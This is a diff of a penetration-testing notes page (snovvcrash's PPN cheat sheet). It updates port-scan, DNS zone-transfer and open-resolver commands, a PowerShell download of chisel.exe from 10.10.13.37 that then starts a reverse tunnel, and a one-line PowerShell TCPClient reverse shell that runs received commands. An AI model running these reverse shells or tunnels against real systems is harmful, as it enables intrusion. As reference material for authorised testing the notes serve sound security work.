@@ -1,4 +1,6 @@
-﻿[![main-page](https://img.shields.io/badge/Back%20to%20the%20main%20page-snovvcrash.github.io-cc0000?style=for-the-badge&logo=jekyll&logoColor=cc0000)](https://snovvcrash.github.io/)
+﻿[![homepage](https://img.shields.io/badge/Homepage-snovvcrash.github.io-success?style=social&logo=jekyll&logoColor=cc0000)](https://snovvcrash.github.io/)
+[![github](https://img.shields.io/github/stars/snovvcrash/PPN?label=Star%20on%20GitHub&style=social)](https://github.com/snovvcrash/PPN)
+[![twitter](https://img.shields.io/twitter/follow/snovvcrash?label=Follow%20on%20Twitter&style=social)](https://twitter.com/snovvcrash)
 
 Use your <kbd>Ctrl</kbd>-<kbd>F</kbd> to navigate this mess.
 
@@ -2605,7 +2607,8 @@ $ sudo rustscan -a 10.10.13.37 --top
 * [https://github.com/projectdiscovery/naabu/releases](https://github.com/projectdiscovery/naabu/releases)
 
 ```
-$ sudo naabu [-interface eth0] -iL hosts.txt -rate 1000 -p - -silent -nmap-cli 'sudo nmap -v -Pn -sVC -O -oA naabutest'
+$ sudo naabu [-interface eth0] -iL hosts.txt -s s -rate 1000 -p - -silent [-nmap-cli 'sudo nmap -v -Pn -sVC -O -oA naabutest']
+$ sudo naabu -host 10.10.13.37 -top-ports 1000
 ```
 
 ##### Nmap
@@ -4932,6 +4935,7 @@ Zone transfer:
 
 ```
 $ dig axfr @dns.example.com example.com
+$ for srv in `cat dns.txt`; do dig axfr "@$srv" example.com | grep "failed" > /dev/null 2>&1 || echo $srv; done
 ```
 
 
@@ -4939,7 +4943,8 @@ $ dig axfr @dns.example.com example.com
 ### nslookup
 
 ```
-$ nslookup example.com (или 127.0.0.1 для PTR)
+$ nslookup example.com [ns.example.com]
+$ nslookup -type=ptr 127.0.0.1
 
 $ nslookup
 [> server dns.example.com]
@@ -4959,8 +4964,13 @@ Check:
 
 ```
 $ host facebook.com ns.example.com
+
 $ dig +short @ns.example.com test.openresolver.com TXT
+$ for srv in `cat dns.txt`; do dig +short @$srv test.openresolver.com TXT | grep "open-resolver-detected" && echo $srv; done
+
 $ sudo nmap -Pn -sU -sV --script dns-recursion ns.example.com -p53
+$ for srv in `cat dns.txt`; do sudo nmap -Pn -sU -sV --script dns-recursion $srv -p53 | grep "enabled" && echo $srv; done
+
 msf > auxiliary/scanner/dns/dns_amp
 ```
 
@@ -5613,7 +5623,7 @@ $ ./chisel server -p 8000 -v --reverse
 
 PS > (new-object net.webclient).downloadfile("http://10.10.13.37/chisel.exe", "$env:userprofile\music\chisel.exe")
 PS > get-filehash -alg md5 chisel.exe
-PS > Start-Process -NoNewWindow chisel.exe client 10.10.13.37:8000 R:127.0.0.1:2222:127.0.0.1:1111
+PS > Start-Process -NoNewWindow -FilePath .\chisel.exe -ArgumentList "client 10.10.13.37:8000 R:127.0.0.1:2222:127.0.0.1:1111"
 ```
 
 Socks5 proxy with Chisel in server mode:
@@ -5979,7 +5989,7 @@ import socket,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.conne
 System.Net.Sockets.TCPClient:
 
 ```
-$client = New-Object System.Net.Sockets.TCPClient("10.10.13.37",1337);$stream = $client.GetStream();[byte[]]$bytes = 0..49151|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+$client = New-Object System.Net.Sockets.TCPClient("10.10.13.37",1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
 
 
@@ -6168,7 +6178,12 @@ PS > Start-Process -NoNewWindow .\xc.exe 10.10.13.38 443
 
 
 
-### ShellPop
+### Payload Generators
+
+* [http://www.jackson-t.ca/runtime-exec-payloads.html](http://www.jackson-t.ca/runtime-exec-payloads.html)
+
+
+#### ShellPop
 
 * [https://github.com/0x00-0x00/ShellPop](https://github.com/0x00-0x00/ShellPop)
 
@@ -7110,6 +7125,14 @@ $ sudo fail2ban-client unban --all
 ```
 $ veracrypt -t --pim=0 --keyfiles='' --protect-hidden=no /home/snovvcrash/SecretVolume.dat /mnt
 $ veracrypt -d
+```
+
+
+
+### openconnect
+
+```
+$ sudo openconnect --protocol=gp gp.megacorp.com -u snovvcrash
 ```
 
 
